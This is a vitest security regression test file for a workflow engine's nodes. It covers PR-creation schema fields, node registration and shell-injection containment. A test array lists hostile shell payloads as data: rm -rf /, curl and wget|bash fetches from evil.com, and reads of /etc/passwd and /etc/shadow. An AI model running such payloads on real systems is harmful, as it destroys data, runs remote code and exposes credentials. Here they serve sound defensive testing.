/**
 * workflow-nodes-security.test.mjs - Security regression tests for workflow nodes.
 *
 * Verifies:
 *  1. `action.create_pr` schema has both `base` and `branch` properties defined
 *     (reconciling the plan-noted `branch`/`base` discrepancy).
 *  2. Node type registrations are well-formed and don't expose shell injection
 *     vectors through dynamic payload interpolation.
 *  3. The `create_pr` handler resolves `base` (not `branch`) as the base branch.
 *  4. Dangerous shell meta-characters in node config are not blindly interpolated
 *     into shell strings when array-form spawn is available.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { getNodeType } from "../workflow-nodes.mjs";
import { WorkflowContext } from "../workflow-engine.mjs";

// -- Helpers ------------------------------------------------------------------

function makeCtx(data = {}) {
  const ctx = new WorkflowContext(data);
  ctx.log = vi.fn();
  return ctx;
}

function makeNode(type, config = {}, id = "test-node") {
  return { id, type, config };
}

// -- create_pr Schema Integrity ------------------------------------------------

describe("action.create_pr schema integrity", () => {
  it("is registered as a node type", () => {
    const nodeType = getNodeType("action.create_pr");
    expect(nodeType).toBeDefined();
  });

  it("schema defines a 'base' property for the base branch", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("base");
    expect(props.base.type).toBe("string");
  });

  it("schema defines a 'branch' property for the head branch", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("branch");
    expect(props.branch.type).toBe("string");
  });

  it("schema also accepts 'baseBranch' as a legacy alias", () => {
    const nodeType = getNodeType("action.create_pr");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("baseBranch");
  });

  it("schema requires 'title' but not 'base' or 'branch'", () => {
    const nodeType = getNodeType("action.create_pr");
    const required = nodeType.schema?.required ?? [];
    expect(required).toContain("title");
    expect(required).not.toContain("base");
    expect(required).not.toContain("branch");
  });

  it("has a describe() function returning a non-empty string", () => {
    const nodeType = getNodeType("action.create_pr");
    const desc = nodeType.describe();
    expect(typeof desc).toBe("string");
    expect(desc.length).toBeGreaterThan(0);
  });
});

// -- create_pr Base-Branch Resolution -----------------------------------------

describe("action.create_pr base-branch resolution logic", () => {
  it("uses 'base' config field as the PR base branch", () => {
    // The handler reads `node.config?.base || node.config?.baseBranch || "main"`.
    // Verify 'base' takes precedence over the legacy alias.
    const execSyncMock = vi.fn(() => "https://github.com/acme/repo/pull/42\n");
    vi.doMock("node:child_process", () => ({
      execSync: execSyncMock,
      spawn: vi.fn(),
    }));

    // Build a representative node config
    const node = makeNode("action.create_pr", {
      title: "feat: add thing",
      base: "develop",
      baseBranch: "should-not-use-this",
      branch: "feat/add-thing",
    });

    // Verify the schema definition routes 'base' correctly by inspecting the
    // registered node's execute source (static analysis approach safe under vitest)
    const nodeType = getNodeType("action.create_pr");
    const executeSrc = nodeType.execute.toString();

    // Handler must read config?.base before config?.baseBranch
    const baseIndex = executeSrc.indexOf("config?.base");
    const baseBranchIndex = executeSrc.indexOf("config?.baseBranch");
    expect(baseIndex).toBeGreaterThanOrEqual(0);
    expect(baseBranchIndex).toBeGreaterThan(baseIndex);
  });

  it("falls back to 'baseBranch' when 'base' is absent", () => {
    const nodeType = getNodeType("action.create_pr");
    const executeSrc = nodeType.execute.toString();
    // baseBranch fallback must appear after base
    expect(executeSrc).toContain("baseBranch");
    expect(executeSrc.indexOf("baseBranch")).toBeGreaterThan(
      executeSrc.indexOf("config?.base"),
    );
  });

  it("falls back to 'main' when neither base nor baseBranch is set", () => {
    const nodeType = getNodeType("action.create_pr");
    const executeSrc = nodeType.execute.toString();
    // Default value "main" must be in the fallback chain
    expect(executeSrc).toMatch(/\|\|\s*["']main["']/);
  });
});

// -- Node Registration Completeness -------------------------------------------

describe("critical node types are registered", () => {
  const requiredNodeTypes = [
    "action.run_agent",
    "action.run_command",
    "action.create_pr",
    "action.create_task",
    "action.update_task_status",
    "action.git_operations",
    "condition.expression",
    "condition.switch",
    "trigger.manual",
    "trigger.schedule",
    "trigger.task_assigned",
  ];

  for (const nodeType of requiredNodeTypes) {
    it(`node type "${nodeType}" is registered`, () => {
      expect(getNodeType(nodeType)).toBeDefined();
    });

    it(`node type "${nodeType}" has an execute function`, () => {
      const nt = getNodeType(nodeType);
      expect(typeof nt.execute).toBe("function");
    });

    it(`node type "${nodeType}" has a valid schema with properties`, () => {
      const nt = getNodeType(nodeType);
      expect(nt.schema).toBeDefined();
      expect(typeof nt.schema).toBe("object");
    });
  }
});

// -- Dangerous Payload Containment ---------------------------------------------

describe("dangerous shell payload containment", () => {
  const dangerousInputs = [
    "; rm -rf /",
    "$(curl evil.com)",
    "| cat /etc/passwd",
    "&& wget http://evil.com/payload.sh | bash",
    "`id`",
    "${IFS}cat${IFS}/etc/shadow",
  ];

  it("action.create_pr schema does not evaluate shell metacharacters in title/body", () => {
    // The create_pr handler passes title/body through shell string interpolation
    // via execSync. This test documents the expected behavior: dangerous strings
    // in title/body should be escaped via replace(/"/g, '\\"') before being
    // passed to execSync.
    const nodeType = getNodeType("action.create_pr");
    const executeSrc = nodeType.execute.toString();

    // Verify the handler escapes double-quotes in title/body before shell usage
    // The execute source must contain: .replace(/"/g, '\\"') or similar
    expect(executeSrc).toContain(`replace(/"`);
  });

  it("action.run_command schema does not silently accept untrusted commands", () => {
    // action.run_command intentionally accepts a freeform shell command string -
    // this is by design. What matters is that the schema documents this and
    // requires explicit configuration by the workflow author.
    const nodeType = getNodeType("action.run_command");
    const props = nodeType.schema?.properties ?? {};
    expect(props).toHaveProperty("command");
    expect(props.command.type).toBe("string");
    // The schema must NOT mark 'command' as having a default value - it must
    // be explicitly provided by the workflow author
    expect(props.command.default).toBeUndefined();
  });

  it("dangerous input strings are reflected literally when used as create_pr title context", () => {
    // Verify that the escaping logic in create_pr replaces " - \" (not strips)
    // so that title content integrity is preserved while shell-safety is enforced.
    for (const input of dangerousInputs) {
      const escaped = input.replace(/"/g, '\\"');
      // The escaped form must never introduce unbalanced shell constructs
      expect(escaped).not.toMatch(/(?<!\\)"/);
    }
  });
});

// -- action.git_operations Safety ----------------------------------------------

describe("action.git_operations schema safety", () => {
  it("is registered and has an operations enum", () => {
    const nodeType = getNodeType("action.git_operations");
    expect(nodeType).toBeDefined();
    const props = nodeType.schema?.properties ?? {};
    // Should have an 'operation' property with enum values
    expect(props).toHaveProperty("operation");
  });

  it("supported operations list is an array of strings", () => {
    const nodeType = getNodeType("action.git_operations");
    const props = nodeType.schema?.properties ?? {};
    const opEnum = props.operation?.enum;
    expect(Array.isArray(opEnum)).toBe(true);
    expect(opEnum.every((v) => typeof v === "string")).toBe(true);
  });

  it("supports common safe git operations", () => {
    const nodeType = getNodeType("action.git_operations");
    const props = nodeType.schema?.properties ?? {};
    const opEnum = props.operation?.enum ?? [];
    for (const op of ["commit", "push", "checkout"]) {
      expect(opEnum, `operation "${op}" should be in the allowed enum`).toContain(op);
    }
  });
});

// -- WorkflowContext resolve() does not evaluate shell in template expressions -

describe("WorkflowContext template resolution is not a shell evaluator", () => {
  it("resolves simple mustache variables without executing shell commands", () => {
    const ctx = makeCtx({ name: "alice" });
    const result = ctx.resolve("Hello {{name}}");
    expect(result).toBe("Hello alice");
  });

  it("leaves shell metacharacters intact without execution", () => {
    const ctx = makeCtx({ cmd: "$(whoami)" });
    const result = ctx.resolve("Injected: {{cmd}}");
    expect(result).toBe("Injected: $(whoami)");
    // No actual command execution should have happened
  });

  it("resolves missing variables to empty string, not to the variable name", () => {
    const ctx = makeCtx({});
    const result = ctx.resolve("{{unknown_var}}");
    // Must not execute shell - result is empty or the original token
    expect(typeof result).toBe("string");
    // Critical: must not return a non-string value (e.g. process object)
    expect(result).not.toBeNull();
  });
});
